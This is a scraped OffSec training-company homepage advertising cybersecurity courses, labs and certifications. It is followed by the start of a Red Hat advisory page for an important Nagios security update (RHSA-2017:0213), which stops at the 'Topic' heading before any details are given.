=== Content from www.offsec.com_c84a2d9e_20250126_033703.html ===


* Solutions Learning Solutions            Learning Library Cyber workforce resilience and career development with hands-on, real-world training      Cyber Ranges Live-fire simulations to train your team and stay ahead of the latest threats         [Courses & Certifications

  Industry-leading certifications and training for continuous learning](https://www.offsec.com/courses-and-certifications)   [Learning Paths

  Focused training to develop skills based on a specific area of interest](https://www.offsec.com/learning/paths)   [Job Roles

  Rigorous training content and labs for the most critical and in-demand job roles](https://www.offsec.com/learning)   [Skills Development

  Focused training to develop critical cybersecurity skills](https://www.offsec.com/learning/skill-paths-pins)   [Industry Frameworks

  Framework-specific training for MITRE ATT&CK, D3FEND and NIST/NICE](https://www.offsec.com/learning/industry-frameworks)   [Explore Learning Library](https://portal.offsec.com/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)     [Enterprise Cyber Range & Versus

  Set up tournaments and test red and blue team skills in a live-fire cyber range](https://www.offsec.com/enterprise/cyber-range)   [Offensive Cyber Range

  Train on the latest attack vectors to address vulnerabilities](https://www.offsec.com/enterprise/cyber-range/offensive)   [Defensive Cyber Range

  Prepare for the next attack with simulated real-world training environments](https://www.offsec.com/enterprise/cyber-range/defensive)   [Watch a demo](https://learn.offsec.com/webinar-cyber-drills-versus/?utm_source=offsec)     [Exclusive

  Hands-on training in live-fire, enterprise environments

  Use our most powerful cyber range to develop a cyber resilient workforce

  ![Hands-on training in live-fire, enterprise environments](https://manage.offsec.com/app/uploads/2024/05/live_fire_feat.png)](https://www.offsec.com/enterprise/cyber-range/versus)
* Why OffSec            Organizations Continuous learning & skill development to build cyber workforce resilience      Individuals Get industry leading training and reinforce learning with hands-on labs         [Teams & Enterprises

  Continuous learning & hands-on skills development for cybersecurity teams](https://www.offsec.com/organizations/enterprise)   [Public Sector

  Unique training for government agencies and educational institutions](https://www.offsec.com/public-sector)   [Use Cases

  Meet critical cyber workforce needs with OffSec's learning platform](https://www.offsec.com/use-cases)   [Industries

  Purpose-built and industry-recognized cybersecurity training](https://www.offsec.com/industry)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Address your talent gap through continuous skills development and knowledge acquisition

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise)     [Attain a Certification

  Prove critical knowledge & skills with an industry-standard certification](https://www.offsec.com/courses-and-certifications)   [Get Hands-on Practice

  Challenge yourself in real-world lab environments](https://www.offsec.com/labs/individual)   [Increase Career Prospects

  Ready yourself for the next step in your cybersecurity career](https://www.offsec.com/products)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)
* Pricing Plans & Pricing            Organizations Flexible solutions designed for organizations across industries and sizes      Individuals Find the right training plan for your unique learning needs         [Subscription Pricing

  Provide continuous Learning Library access to build cyber workforce resilience](https://www.offsec.com/pricing/organization)   [Cyber Ranges

  Hands-on training in live-fire, simulation environments](https://www.offsec.com/labs/enterprise)   [Pentesting Services

  Let OffSec conduct a comprehensive vulnerability assessment](https://www.offsec.com/penetration-testing)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Provide continuous learning and skill development with Learn Enterprise. Access to the entire Learning Library and the Enterprise Cyber Range for everyone on your team.

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise/)     [Pricing

  Flexible options based on your learning goals](https://www.offsec.com/pricing/individual)   [![Learn One](/_astro/one.CuIttstx_1iqdIc.svg)   Learn One

  12-month access to a single course, related labs, and two exam attempts](https://www.offsec.com/products/learn-one)   [![Course & Certification Bundle](/_astro/courses.DUpgYt2-_ZJbVTu.svg)   Course & Certification Bundle

  90-day access to a single course, related labs, and one exam attempt](https://www.offsec.com/products/90-day-bundle)   [![Learn Fundamentals](/_astro/fundamentals.iMOuAzP9_Z1YsvOA.svg)   Learn Fundamentals

  12-month access to introductory- and essential-level content](https://www.offsec.com/products/fundamentals)   [Proving Grounds Labs

  OffSec-curated private labs to practice and perfect your pentesting skills](https://www.offsec.com/labs/individual)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200)
* Partners         [Global Partner Program](https://www.offsec.com/global-partners)   [Partner Portal Login](https://partnerportal.offsec.com/?utm_source=offsec#/page/login)   [Find a Partner](https://www.offsec.com/partner-locator)

  Become a Partner

  Add OffSec to your list of training providers

   [Partner with us](https://www.offsec.com/global-partners/#application)
* Community Kali & Community         [Join Our Community](https://www.offsec.com/community-sign-up)   [Kali Linux](http://www.kali.org/get-kali/?utm_source=offsec)   [Community Projects](https://www.offsec.com/community-projects)   [OffSec Discord](https://offs.ec/discord?utm_source=offsec)   [OffSec Live](https://www.twitch.tv/offsecofficial?utm_source=offsec)

  Connect with us

  OffSec office hours every Friday on Twitch

   [OffSec Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
* Resources
  + [Read](https://www.offsec.com/resources)
  - [Blog](https://www.offsec.com/blog/)
  - [Case Studies](https://www.offsec.com/resources/case-study)
  - [Guides](https://www.offsec.com/resources/guides)
  - [White Papers](https://www.offsec.com/resources/whitepaper)
  - [Product Updates](https://www.offsec.com/resources/product-updates)
  + Watch
  - [Webinars](https://www.offsec.com/webinars)
  - [Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
  - [YouTube](https://www.youtube.com/%40OffSecTraining?utm_source=offsec)
  + Learn
  - [Cyberversity](https://www.offsec.com/cyberversity)
  - [Cybersecurity Job Roles](https://www.offsec.com/cybersecurity-roles)
  + Work at OffSec
  - [Careers](https://www.offsec.com/careers)
  - [Values](https://www.offsec.com/values)
  + [Live Training & Events](https://www.offsec.com/training-and-events)
  + [Subscribe to our Newsletters](https://www.offsec.com/subscriptions)
  + [Press Room](https://www.offsec.com/press-room)
  + [Help Center](https://help.offsec.com/hc/en-us?utm_source=offsec)
  + [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)   [View the Resource Center](/resources/)        [Press Release

  Leeds Equity Partners Acquires OffSec

  Leeds Equity Partners announced that it has acquired OffSec, the leading provider of continuous cybersecurity workforce development training and professional education for cybersecurity practitioners from Spectrum Equity

  ![Leeds Equity Partners Acquires OffSec](https://manage.offsec.com/wp-content/uploads/2023/08/Homepage-default-preview.jpg)](https://www.prnewswire.com/news-releases/leeds-equity-partners-acquires-offsec-302275836.html?utm_source=offsec)
      [Buy now](/pre-registration/)  [Sign In](https://portal.offensive-security.com/sign-in/)    [Contact](/contact-us/)

* Solutions Learning Solutions            Learning Library Cyber workforce resilience and career development with hands-on, real-world training      Cyber Ranges Live-fire simulations to train your team and stay ahead of the latest threats         [Courses & Certifications

  Industry-leading certifications and training for continuous learning](https://www.offsec.com/courses-and-certifications)   [Learning Paths

  Focused training to develop skills based on a specific area of interest](https://www.offsec.com/learning/paths)   [Job Roles

  Rigorous training content and labs for the most critical and in-demand job roles](https://www.offsec.com/learning)   [Skills Development

  Focused training to develop critical cybersecurity skills](https://www.offsec.com/learning/skill-paths-pins)   [Industry Frameworks

  Framework-specific training for MITRE ATT&CK, D3FEND and NIST/NICE](https://www.offsec.com/learning/industry-frameworks)   [Explore Learning Library](https://portal.offsec.com/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)     [Enterprise Cyber Range & Versus

  Set up tournaments and test red and blue team skills in a live-fire cyber range](https://www.offsec.com/enterprise/cyber-range)   [Offensive Cyber Range

  Train on the latest attack vectors to address vulnerabilities](https://www.offsec.com/enterprise/cyber-range/offensive)   [Defensive Cyber Range

  Prepare for the next attack with simulated real-world training environments](https://www.offsec.com/enterprise/cyber-range/defensive)   [Watch a demo](https://learn.offsec.com/webinar-cyber-drills-versus/?utm_source=offsec)     [Exclusive

  Hands-on training in live-fire, enterprise environments

  Use our most powerful cyber range to develop a cyber resilient workforce

  ![Hands-on training in live-fire, enterprise environments](https://manage.offsec.com/app/uploads/2024/05/live_fire_feat.png)](https://www.offsec.com/enterprise/cyber-range/versus)
* Why OffSec            Organizations Continuous learning & skill development to build cyber workforce resilience      Individuals Get industry leading training and reinforce learning with hands-on labs         [Teams & Enterprises

  Continuous learning & hands-on skills development for cybersecurity teams](https://www.offsec.com/organizations/enterprise)   [Public Sector

  Unique training for government agencies and educational institutions](https://www.offsec.com/public-sector)   [Use Cases

  Meet critical cyber workforce needs with OffSec's learning platform](https://www.offsec.com/use-cases)   [Industries

  Purpose-built and industry-recognized cybersecurity training](https://www.offsec.com/industry)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Address your talent gap through continuous skills development and knowledge acquisition

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise)     [Attain a Certification

  Prove critical knowledge & skills with an industry-standard certification](https://www.offsec.com/courses-and-certifications)   [Get Hands-on Practice

  Challenge yourself in real-world lab environments](https://www.offsec.com/labs/individual)   [Increase Career Prospects

  Ready yourself for the next step in your cybersecurity career](https://www.offsec.com/products)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)
* Pricing Plans & Pricing            Organizations Flexible solutions designed for organizations across industries and sizes      Individuals Find the right training plan for your unique learning needs         [Subscription Pricing

  Provide continuous Learning Library access to build cyber workforce resilience](https://www.offsec.com/pricing/organization)   [Cyber Ranges

  Hands-on training in live-fire, simulation environments](https://www.offsec.com/labs/enterprise)   [Pentesting Services

  Let OffSec conduct a comprehensive vulnerability assessment](https://www.offsec.com/penetration-testing)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Provide continuous learning and skill development with Learn Enterprise. Access to the entire Learning Library and the Enterprise Cyber Range for everyone on your team.

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise/)     [Pricing

  Flexible options based on your learning goals](https://www.offsec.com/pricing/individual)   [![Learn One](/_astro/one.CuIttstx_1iqdIc.svg)   Learn One

  12-month access to a single course, related labs, and two exam attempts](https://www.offsec.com/products/learn-one)   [![Course & Certification Bundle](/_astro/courses.DUpgYt2-_ZJbVTu.svg)   Course & Certification Bundle

  90-day access to a single course, related labs, and one exam attempt](https://www.offsec.com/products/90-day-bundle)   [![Learn Fundamentals](/_astro/fundamentals.iMOuAzP9_Z1YsvOA.svg)   Learn Fundamentals

  12-month access to introductory- and essential-level content](https://www.offsec.com/products/fundamentals)   [Proving Grounds Labs

  OffSec-curated private labs to practice and perfect your pentesting skills](https://www.offsec.com/labs/individual)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200)
* Partners         [Global Partner Program](https://www.offsec.com/global-partners)   [Partner Portal Login](https://partnerportal.offsec.com/?utm_source=offsec#/page/login)   [Find a Partner](https://www.offsec.com/partner-locator)

  Become a Partner

  Add OffSec to your list of training providers

   [Partner with us](https://www.offsec.com/global-partners/#application)
* Community Kali & Community         [Join Our Community](https://www.offsec.com/community-sign-up)   [Kali Linux](http://www.kali.org/get-kali/?utm_source=offsec)   [Community Projects](https://www.offsec.com/community-projects)   [OffSec Discord](https://offs.ec/discord?utm_source=offsec)   [OffSec Live](https://www.twitch.tv/offsecofficial?utm_source=offsec)

  Connect with us

  OffSec office hours every Friday on Twitch

   [OffSec Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
* Resources
  + [Read](https://www.offsec.com/resources)
  - [Blog](https://www.offsec.com/blog/)
  - [Case Studies](https://www.offsec.com/resources/case-study)
  - [Guides](https://www.offsec.com/resources/guides)
  - [White Papers](https://www.offsec.com/resources/whitepaper)
  - [Product Updates](https://www.offsec.com/resources/product-updates)
  + Watch
  - [Webinars](https://www.offsec.com/webinars)
  - [Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
  - [YouTube](https://www.youtube.com/%40OffSecTraining?utm_source=offsec)
  + Learn
  - [Cyberversity](https://www.offsec.com/cyberversity)
  - [Cybersecurity Job Roles](https://www.offsec.com/cybersecurity-roles)
  + Work at OffSec
  - [Careers](https://www.offsec.com/careers)
  - [Values](https://www.offsec.com/values)
  + [Live Training & Events](https://www.offsec.com/training-and-events)
  + [Subscribe to our Newsletters](https://www.offsec.com/subscriptions)
  + [Press Room](https://www.offsec.com/press-room)
  + [Help Center](https://help.offsec.com/hc/en-us?utm_source=offsec)
  + [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)   [View the Resource Center](/resources/)        [Press Release

  Leeds Equity Partners Acquires OffSec

  Leeds Equity Partners announced that it has acquired OffSec, the leading provider of continuous cybersecurity workforce development training and professional education for cybersecurity practitioners from Spectrum Equity

  ![Leeds Equity Partners Acquires OffSec](https://manage.offsec.com/wp-content/uploads/2023/08/Homepage-default-preview.jpg)](https://www.prnewswire.com/news-releases/leeds-equity-partners-acquires-offsec-302275836.html?utm_source=offsec)
      [Buy now](/pre-registration/) [Sign in](https://portal.offensive-security.com/sign-in/)   [Contact us](/contact-us/)   Learning Solutions  Why OffSec  Plans & Pricing  Partners  Kali & Community  Resources       Dismiss

Looking for Live Training in 2025? -
[View upcoming classes](/training-and-events/)

# Elevating Cyber Workforce and Professional Development

Empowering individuals and organizations to fight cyber threats with indispensable cybersecurity skills and resources.

   [For individuals](/pricing/)  [For organizations](/organizations/enterprise/)
## Trusted by

      ![](/_astro/courses-honeycomb-2.BJsud3cm_AM0V4.svg)
## Learning with OffSec

Our learning platform and library include the most rigorous content, courses, learning paths
and hands-on labs

 [Explore our products](/products/)
## What you'll find in our Learning Library

### 7,800+

Hours of written content

### 1,600+

Videos

### 5,460

Labs

\*Data as of 1/24/2025

 [Watch demo](/resources/gated-content/le-ocr-demo/)
## Find OffSec training for your cybersecurity role or area of responsibility

![](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Essentials

Intermediate

Advanced

   ![](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Essentials

Intermediate

Advanced

   ![](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Essentials

Intermediate

Advanced

   ![](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Essentials

Intermediate

Entry-level

Essentials

Intermediate

Advanced

 [![](/_astro/sec-100.Cpi0-2Uw.svg)
### CyberCore

Gain core knowledge required for any cybersecurity role](/courses/sec-100/)       ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Understand the attacker mindset

 ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Develop hacking and pentesting skills

 ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Expert protections across organizations

    ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Understand defensive requirements

 ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Develop mitigation procedures

 ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Proactive, resilient defenses

    ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Learn risks and track security in development

 ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Integrate security best practices into dev

 ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Security first software development lifecycle

    ![Cybersecurity](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Understand cybersecurity for IT and System Admins

 ![Cybersecurity](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Develop secure processes

= Course Certification

= Learning Path Badge

## What cybersecurity professionals are saying

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)
### Emile Kok

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)
### Douglas Costa

Cyber Threat Intelligence & Threat Hunter

  This certification reinforces my ability to think creatively, manage time and resources effectively, and persist through complex challenges.
## Cybersecurity talent management with OffSec

### Assess

#### Goal of this stage

Understand skills of candidates to pick the right person for open roles.

#### How OffSec can help

Build tournaments to assess candidates in real-world scenarios. Renowned certifications can be used to in the application process.

 [Check out Assessments](/enterprise/cyber-range/)

Assess

### Onboard

#### Goal of this stage

Train teams to get them up to speed for their new roles and build a foundation of shared knowledge across the team.

#### How OffSec can help

Entry-level courses ground teams in the OffSec mindset. Job role based learning paths & courses support specific roles get up to speed faster.

 [Explore the Library](https://portal.offsec.com)

Onboard

### Upskill

#### Goal of this stage

Identify skill gaps and train to fill those gaps to protect the organization.

#### How OffSec can help

Identify skill gaps with learning path assessments & Versus tournaments. Build custom learning paths for team members to get them the training they need to protect the organization.

 [Build a Custom Learning Path](https://learn.offsec.com/hubfs/Creating%20a%20custom%20path.mp4)

Upskill

### Retain

#### Goal of this stage

Build an engaging employee culture and career development plans that continue to challenge employees.

#### How OffSec can help

Build team camaraderie with Versus tournaments. Develop custom training for job roles & increase difficulty over time.

 [Try a Tournament](/enterprise/cyber-range/versus/)

Retain

## Our unique learning approach

#### Growth

Practicing creative applications leads to growth and knowledge expansion

#### Triumph

Create confidence, pattern recognition, wisdom and allow the cycle to repeat for new learnings

#### Trial

The trial process equips our learner to understand, learn, apply, analyze, synthesize and hypothesize

#### Failure

Failure is a key part of learning, how to get unstuck is a key skill. Grit is necessary to learn

#### Adaptation

Creative ideas and approaches will emerge through trial and failure

## What's new at OffSec

   [![](https://www.offsec.com/app/uploads/2025/01/ir-200-450x236.png)

Research & Tutorials

### My Journey with IR-200: Becoming an OffSec Certified Incident Responder (OSIR)

Embark on a journey to become an OffSec Certified Incident Responder (OSIR) through the IR-200 course, as described by a Student Mentor who tested its effectiveness.

Jan 24, 2025

6 min read](/blog/my-journey-with-ir-200-becoming-an-offsec-certified-incident-responder-osir/)   [![](https://www.offsec.com/app/uploads/2025/01/th-200-450x236.png)

Research & Tutorials

### A Student Mentorâs TH-200 and OSTH Learning Experience

Explore the TH-200 course & OSTH exam with an OffSec Mentor’s insights on mastering threat hunting skills.

Jan 24, 2025

9 min read](/blog/a-student-mentors-th-200-and-osth-learning-experience/)   [![](https://www.offsec.com/app/uploads/2024/12/EOY-2024-blog-post-header-450x236.jpg)

OffSec News

### OffSec Yearly Recap 2024

Join us as we explore all our successes in 2024, including exciting new content, courses, and so much more!

Dec 23, 2024

8 min read](/blog/offsec-yearly-recap-2024/)     [View all blogs](/blog/)
## Our free open-source tools

  [![Kali](/_astro/kali.CU8ZWzHb_21DCwb.svg)](https://kali.org)  [![Kali NetHunter](/_astro/KNH.Cqcp042z_Z1swOvJ.svg)](https://www.kali.org/docs/nethunter/)  [![Exploit Database](/_astro/EXDB.BZmZGyho_2oAweA.svg)](https://exploit-db.org)  [![Google hacking database](/_astro/GHDB.BMpIw1YW_kqYpF.svg)](https://www.exploit-db.com/google-hacking-database)  [![Metasploit Unleashed](/_astro/metasploit.CWelKEsw_Z1kLJ3A.svg)](https://www.offsec.com/metasploit-unleashed/)

Get the latest updates around resources, events & promotions from OffSec

 Submit        Products and Pricing

* [Courses & Content](https://www.offsec.com/courses-and-certifications/)
* [Learn Subscriptions](https://www.offsec.com/products/)
* [Proving Grounds Labs](https://www.offsec.com/labs/individual/)
* [Enterprise Cyber Range](https://www.offsec.com/enterprise/cyber-range/)
* [Pricing](https://www.offsec.com/pricing/)
 About OffSec

* [Contact Us](https://www.offsec.com/contact-us/)
* [Careers](https://www.offsec.com/careers/)
* [Why OffSec?](https://www.offsec.com/why-offsec/)
* [Values](https://www.offsec.com/values/)
* [Leadership Team](https://www.offsec.com/leadership-team/)
* [Bug Bounty Program](https://www.offsec.com/bug-bounty-program/)
* [User-Generated Content](https://www.offsec.com/labs/submit/)
 Resources

* [Resource Center](https://www.offsec.com/resources/)
* [Blog](https://www.offsec.com/blog/)
* [OffSec Cyberversity](https://www.offsec.com/cyberversity/)
* [Press Room](https://www.offsec.com/press-room/)
* [Join our Mailing List](https://www.offsec.com/subscriptions/)
* [Help Center](https://help.offensive-security.com/hc/en-us?utm_source=offsec)
* [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)

  [Feedback](https://www.offsec.com/contact-us/)[Legal](https://www.offsec.com/legal-docs/)[Trust & Compliance](https://trust.offsec.com/?utm_source=offsec)[RSS Feed](https://www.offsec.com/feed)  Â© OffSec Services Limited 2025 All rights reserved

=== Content from rhn.redhat.com_1c9f3200_20250124_212412.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2017:0213 - Security Advisory

Issued:
2017-01-31
Updated:
2017-01-31
# RHSA-2017:0213 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: nagios security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0213)

## Topic

